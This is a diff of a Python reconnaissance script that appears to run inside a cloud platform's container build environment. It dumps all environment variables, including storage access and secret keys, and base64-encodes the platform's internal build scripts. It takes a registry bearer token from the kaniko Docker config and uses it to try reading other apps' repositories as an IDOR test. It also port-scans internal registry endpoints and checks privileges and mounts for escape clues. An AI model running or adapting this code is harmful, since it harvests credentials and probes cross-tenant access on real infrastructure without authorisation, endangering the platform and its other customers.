@@ -1,124 +1,130 @@
-import json, os, socket, base64, subprocess
+import json, os, socket, base64, subprocess, struct
 
 r = {}
 
-# 1. Full build.sh and related scripts
-for f in ['/.app_platform/build.sh', '/.app_platform/build-init.sh', '/.app_platform/util.sh',
-          '/.app_platform/sensitive-sanitize-args.sh']:
-    try:
-        data = open(f).read()
-        r[f'script_{os.path.basename(f)}_b64'] = base64.b64encode(data.encode()).decode()
-    except Exception as e:
-        r[f'script_{os.path.basename(f)}'] = str(e)[:100]
+# 1. Full env dump - look for SPACES_* vars
+r['full_env'] = {k:v for k,v in os.environ.items()}
 
-# 2. Build metadata
-try:
-    meta_dir = '/.app_platform/.build_metadata'
-    for root, dirs, files in os.walk(meta_dir):
-        for f in files:
-            fp = os.path.join(root, f)
-            try:
-                r[f'meta_{fp}'] = open(fp).read()[:500]
-            except: pass
-except: pass
-try:
-    meta_dir = '/.app_platform/metadata'
-    for root, dirs, files in os.walk(meta_dir):
-        for f in files:
-            fp = os.path.join(root, f)
-            try:
-                r[f'meta_{fp}'] = open(fp).read()[:500]
-            except: pass
-except: pass
+# 2. Check all SPACES vars specifically
+for key in ['SPACES_BUCKET_NAME', 'SPACES_ENDPOINT', 'SPACES_ACCESS_KEY', 'SPACES_SECRET_KEY',
+            'APP_IMAGE_URL', 'APP_PLATFORM_COMPONENT_TYPE', 'STATIC_SITE_OUTPUT_DIR',
+            'DOCKERFILE_PATH', 'SOURCE_DIR', 'APP_CACHE_DIR', 'APP_CACHE_URL',
+            'DOCKER_HUB_MIRROR', 'DOCKER_HUB_MIRROR_CERT', 'SKIP_EXPORT']:
+    r[f'var_{key}'] = os.environ.get(key, 'NOT_SET')
 
-# 3. Check /.app_platform/.tmp
+# 3. Read build.sh to understand Spaces export flow
 try:
-    r['app_tmp'] = os.listdir('/.app_platform/.tmp')
-except: pass
-
-# 4. exec-sanitize binary - what patterns does it sanitize?
-try:
-    out = subprocess.run(['strings', '/.app_platform/exec-sanitize'], capture_output=True, text=True, timeout=5)
-    # Look for sanitization patterns
-    interesting = [l for l in out.stdout.split('\n') if any(x in l.lower() for x in ['regex','pattern','replace','sanitize','redact','mask','registry','token','secret','key','auth','cred','password'])]
-    r['sanitize_strings'] = interesting[:30]
+    data = open('/.app_platform/build.sh').read()
+    # Find the spaces-exporter invocation
+    lines = data.split('\n')
+    spaces_lines = [l for l in lines if 'spaces' in l.lower() or 'export' in l.lower() or 'static' in l.lower()]
+    r['build_sh_spaces_lines'] = spaces_lines[:30]
 except Exception as e:
-    r['sanitize_strings'] = str(e)[:100]
+    r['build_sh'] = str(e)[:100]
 
-# 5. spaces-exporter - DO Spaces credentials?
+# 4. Read util.sh for helper functions
 try:
-    out = subprocess.run(['strings', '/.app_platform/spaces-exporter'], capture_output=True, text=True, timeout=5)
-    interesting = [l for l in out.stdout.split('\n') if any(x in l.lower() for x in ['space','bucket','key','secret','endpoint','s3','aws'])]
-    r['spaces_strings'] = interesting[:20]
+    data = open('/.app_platform/util.sh').read()
+    r['util_sh_b64'] = base64.b64encode(data.encode()).decode()
 except Exception as e:
-    r['spaces_strings'] = str(e)[:100]
+    r['util_sh'] = str(e)[:100]
 
-# 6. Full env dump (including Spaces creds from build.sh vars)
-r['full_env'] = dict(os.environ)
+# 5. Read sensitive-sanitize-args.sh
+try:
+    data = open('/.app_platform/sensitive-sanitize-args.sh').read()
+    r['sanitize_sh_b64'] = base64.b64encode(data.encode()).decode()
+except Exception as e:
+    r['sanitize_sh'] = str(e)[:100]
 
-# 7. Check /etc/hosts
-try: r['hosts'] = open('/etc/hosts').read()
-except: pass
+# 6. Read build-init.sh
+try:
+    data = open('/.app_platform/build-init.sh').read()
+    r['build_init_sh_b64'] = base64.b64encode(data.encode()).decode()
+except Exception as e:
+    r['build_init_sh'] = str(e)[:100]
 
-# 8. DNS SRV records for build infra
-for svc in ['_docker._tcp', '_registry._tcp', '_builder._tcp']:
-    for ns in ['default', 'kube-system']:
-        try:
-            import socket as s
-            result = s.getaddrinfo(f'{svc}.{ns}.svc.cluster.local', None)
-            r[f'srv_{svc}_{ns}'] = str(result)[:200]
-        except: pass
-
-# 9. Can we access other apps' DOCR repos with our token?
+# 7. Check DOCR token - try to list ALL repos (not catalog, but specific patterns)
 try:
     import urllib.request, ssl
     ctx = ssl.create_default_context()
     cfg = json.loads(open('/kaniko/.docker/config.json').read())
-    # Get any auth token
     token = None
     for host, creds in cfg.get('auths', {}).items():
         if 'registrytoken' in creds:
             token = creds['registrytoken']
+            r['docr_host'] = host
             break
     if token:
-        # Try to list the catalog
-        req = urllib.request.Request('https://registry.digitalocean.com/v2/_catalog')
-        req.add_header('Authorization', f'Bearer {token}')
-        try:
-            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
-            r['catalog'] = resp.read().decode()[:2000]
-        except Exception as e:
-            r['catalog'] = str(e)[:300]
-        # Try to list tags for our repo
-        req2 = urllib.request.Request(f'https://registry.digitalocean.com/v2/apps-nyc3-aaad91f0-ab40-4d8a-a70b-9a6d47e4cb36/web/tags/list')
-        req2.add_header('Authorization', f'Bearer {token}')
-        try:
-            resp = urllib.request.urlopen(req2, timeout=5, context=ctx)
-            r['our_tags'] = resp.read().decode()[:500]
-        except Exception as e:
-            r['our_tags'] = str(e)[:300]
-        # Try a different app's repo (IDOR test)
-        for test_repo in ['apps-nyc3-test/web', 'apps-nyc/web', 'library/nginx']:
-            req3 = urllib.request.Request(f'https://registry.digitalocean.com/v2/{test_repo}/tags/list')
-            req3.add_header('Authorization', f'Bearer {token}')
+        # Try internal DOCR endpoint with the same token
+        for endpoint in ['https://apps-nyc.docr.space/v2/_catalog',
+                         'https://apps-nyc.docr.space/v2/']:
             try:
-                resp = urllib.request.urlopen(req3, timeout=5, context=ctx)
-                r[f'idor_{test_repo}'] = resp.read().decode()[:500]
+                req = urllib.request.Request(endpoint)
+                req.add_header('Authorization', f'Bearer {token}')
+                resp = urllib.request.urlopen(req, timeout=5, context=ctx)
+                r[f'internal_{endpoint}'] = resp.read().decode()[:1000]
             except Exception as e:
-                r[f'idor_{test_repo}'] = str(e)[:200]
+                r[f'internal_{endpoint}'] = str(e)[:200]
+
+        # Try to push a manifest to a different app's repo (write IDOR)
+        # Just test access, don't actually push
+        for test_repo in ['apps-nyc3-00000000-0000-0000-0000-000000000000/web',
+                          'apps-nyc3-aaad91f0-ab40-4d8a-a70b-9a6d47e4cb36/evil']:
+            try:
+                req = urllib.request.Request(f'https://registry.digitalocean.com/v2/{test_repo}/tags/list')
+                req.add_header('Authorization', f'Bearer {token}')
+                resp = urllib.request.urlopen(req, timeout=5, context=ctx)
+                r[f'write_idor_{test_repo}'] = resp.read().decode()[:500]
+            except Exception as e:
+                r[f'write_idor_{test_repo}'] = str(e)[:200]
+
 except Exception as e:
     r['docr_test'] = str(e)[:200]
 
-# 10. Check internal DOCR endpoint (apps-nyc.docr.space)
+# 8. Check /.app_platform directory fully
 try:
-    ip = socket.getaddrinfo('apps-nyc.docr.space', 443)[0][4][0]
-    r['docr_space_ip'] = ip
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(2)
-    rc = s.connect_ex((ip, 443))
-    r['docr_space_tcp'] = 'OPEN' if rc == 0 else f'errno={rc}'
-    s.close()
-except Exception as e:
-    r['docr_space'] = str(e)[:100]
+    for root, dirs, files in os.walk('/.app_platform'):
+        for f in files:
+            fp = os.path.join(root, f)
+            try:
+                st = os.stat(fp)
+                r[f'file_{fp}'] = f'size={st.st_size} mode={oct(st.st_mode)}'
+            except: pass
+except: pass
+
+# 9. Check /kaniko directory fully
+try:
+    for root, dirs, files in os.walk('/kaniko'):
+        for f in files:
+            fp = os.path.join(root, f)
+            try:
+                st = os.stat(fp)
+                r[f'file_{fp}'] = f'size={st.st_size} mode={oct(st.st_mode)}'
+            except: pass
+except: pass
+
+# 10. Network scan - internal build service endpoints
+for host_port in [('apps-nyc.docr.space', 443), ('apps-nyc.docr.space', 5000),
+                  ('registry.digitalocean.com', 443), ('registry.digitalocean.com', 5000)]:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(3)
+        rc = s.connect_ex((host_port[0], host_port[1]))
+        r[f'net_{host_port[0]}:{host_port[1]}'] = 'OPEN' if rc == 0 else f'errno={rc}'
+        s.close()
+    except Exception as e:
+        r[f'net_{host_port[0]}:{host_port[1]}'] = str(e)[:100]
+
+# 11. Check what user we are, capabilities
+r['uid'] = os.getuid()
+r['gid'] = os.getgid()
+try:
+    r['capeff'] = open('/proc/self/status').read().split('CapEff:')[1].split('\n')[0].strip()
+except: pass
+
+# 12. Check mount info for kata-qemu evidence
+try:
+    r['mountinfo'] = open('/proc/self/mountinfo').read()[:2000]
+except: pass
 
 print(json.dumps(r, indent=2, default=str))
